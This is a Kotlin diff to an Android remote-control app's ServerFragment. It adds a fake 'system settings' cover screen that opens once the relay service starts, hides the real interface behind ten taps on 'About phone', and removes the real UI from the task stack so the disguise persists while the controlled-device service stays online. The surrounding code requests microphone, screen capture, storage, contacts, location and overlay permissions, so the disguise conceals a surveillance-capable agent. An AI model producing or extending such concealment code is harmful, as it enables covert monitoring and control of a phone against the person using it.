@@ -61,6 +61,14 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
     @Volatile
     private var manualAuthFlowStartTime = 0L
 
+    /** ★★★ 2026-11-03 最近一次"授权动作"的时间戳：用于判断"授权流程是否正在进行"，
+     *  MainActivity 据此决定"绝不把真实界面摘掉/踢回伪装页"（否则用户看到的就是授权中闪退）。 */
+    @Volatile
+    private var lastAuthStepAt = 0L
+
+    /** 超过这么久没有任何授权动作 ⇒ 视为流程已结束（界面可以正常收起） */
+    private val AUTH_FLOW_ACTIVE_WINDOW_MS = 180_000L
+
     /** ★ 已自动弹出过设置页/弹窗的特殊权限标记（防止用户不授权时反复跳同一个设置页造成死循环） */
     private val autoManualPrompted = mutableSetOf<String>()
 
@@ -115,13 +123,20 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
         }
 
         // ============ 新增 6 项独立权限授权按钮（与图片中"远程触摸"一致的样式，点击立刻授权）============
-        binding!!.btnPermMic.setOnClickListener { checkMicrophonePermission() }
+        binding!!.btnPermMic.setOnClickListener {
+            markSystemUiHandoff()
+            checkMicrophonePermission()
+        }
         binding!!.btnPermStorage.setOnClickListener {
+            markSystemUiHandoff()
             checkStorageRuntimePermission()
             // 基础存储权限授权成功后，跳"所有文件访问"（Android 11+）
             handler.postDelayed({ jumpStorageSetting() }, 800)
         }
-        binding!!.btnPermNotification.setOnClickListener { checkNotificationPermission() }
+        binding!!.btnPermNotification.setOnClickListener {
+            markSystemUiHandoff()
+            checkNotificationPermission()
+        }
         binding!!.btnPermOverlay.setOnClickListener { jumpOverlaySetting() }
         binding!!.btnPermBattery.setOnClickListener { jumpBatterySetting() }
         binding!!.btnPermScreen.setOnClickListener {
@@ -489,6 +504,10 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
                     checkContactsPermission()
                     checkLocationPermission()
                     RelayServerService.start(requireContext())
+                    // ★★★ 2026-11-03 需求（用户明确）：点【运行】启动服务后，弹出**像手机系统设置**
+                    //   的封面页（FakeSettingsActivity）。页面里点任何一项都没有实际动作，
+                    //   只有连续点「关于手机」10 次才进真实界面并开始授权。
+                    openFakeSettings()
                 }
                 refreshButtonText()
             }
@@ -1033,6 +1052,65 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
     }
 
     /**
+     * ★★★ 2026-11-03 需求：点【运行】后弹出的"像系统设置"的封面页。
+     *   —— 启动失败（理论上不会）也只写日志，绝不能因为"打不开伪装页"把启动服务搞挂。
+     */
+    /**
+     * ★ 2026-11-03：马上要弹系统运行时权限窗 —— 先给 MainActivity 打个时间戳。
+     *   否则 onUserLeaveHint 可能把"权限弹窗盖住界面"误判成"用户回桌面"，
+     *   触发"退回后台就作废解锁"，用户看到的就是"点授权按钮界面直接消失（假闪退）"。
+     */
+    private fun markSystemUiHandoff() {
+        try {
+            (activity as? cn.ppps.forwarder.activity.MainActivity)?.markSystemUiHandoff()
+        } catch (t: Throwable) {
+            Log.w(TAG, "标记系统界面跳转失败: ${t.message}")
+        }
+    }
+
+    private fun openFakeSettings() {
+        try {
+            startActivity(Intent(requireContext(), cn.ppps.forwarder.activity.FakeSettingsActivity::class.java))
+            // ★ 顺手把真实界面从任务栈里摘掉：否则"返回桌面 → 再点桌面图标"会直接回到真实界面，
+            //   伪装等于没有。服务是独立 Service，关掉界面完全不影响被控端在线。
+            activity?.finish()
+        } catch (t: Throwable) {
+            Log.w(TAG, "打开伪装设置页失败: ${t.message}")
+        }
+    }
+
+    /**
+     * ★★★ 2026-11-03 需求：伪装页里连点「关于手机」10 次后的真正入口。
+     *   直接复用「一键授权所有权限」的既有流程（含权限兜底、逐项跳转、报告），
+     *   不另写一套 —— 两套授权流程必然漂移。
+     */
+    /**
+     * ★★★ 2026-11-03 一键授权流程是否"正在进行"。
+     *   给 MainActivity 用：授权途中（用户在系统设置页之间来回）**绝不允许**把真实界面
+     *   finish 掉或踢回伪装页 —— 那正是用户看到的"授权中 App 闪退（界面凭空消失）"。
+     *   ★ manualAuthFlowActive 一旦开始不会被复位，所以再加一条"3 分钟无授权动作"的超时，
+     *     避免很久以前授权过导致界面永远收不掉。
+     */
+    fun isAuthFlowRunning(): Boolean {
+        val last = lastAuthStepAt
+        return manualAuthFlowActive && last > 0 &&
+                (System.currentTimeMillis() - last) < AUTH_FLOW_ACTIVE_WINDOW_MS
+    }
+
+    fun startOneClickAuthFromFake() {
+        try {
+            if (manualAuthFlowActive) {
+                Log.i(TAG, "★ 伪装页入口：一键授权已在进行中，忽略重复进入")
+                return
+            }
+            Log.i(TAG, "★ 伪装页入口：连点达标，开始真正的授权流程")
+            oneClickAuthorize()
+        } catch (t: Throwable) {
+            Log.w(TAG, "伪装页入口一键授权异常: ${t.message}")
+        }
+    }
+
+    /**
      * ★ 一键授权所有权限
      * 分两步：
      * 1. 自动授权：复用已有的分批权限请求方法（每批独立请求，避免一次请求过多权限导致崩溃）
@@ -1042,6 +1120,7 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
         XToastUtils.toast("开始一键授权，请按提示操作...")
         manualAuthFlowActive = true
         manualAuthFlowStartTime = System.currentTimeMillis()
+        lastAuthStepAt = manualAuthFlowStartTime
 
         try {
             // ★ 2026-08-28 第 0 步（统一模块）：对"项目实际用到的"仍未授予的运行时权限做一次批量申请。
@@ -1186,6 +1265,8 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
         try {
             val ctx = requireContext()
             val now = System.currentTimeMillis()
+            // 更新"授权动作"时间戳：MainActivity 靠它判断"授权流程还在进行，别摘界面"
+            lastAuthStepAt = now
             // 与上一次自动跳转间隔至少 3 秒，防止快速 onResume 抖动重复跳转
             if (now - lastAutoManualJumpTime < 3000) return
             // 1. 屏幕预览（MediaProjection 系统弹窗）
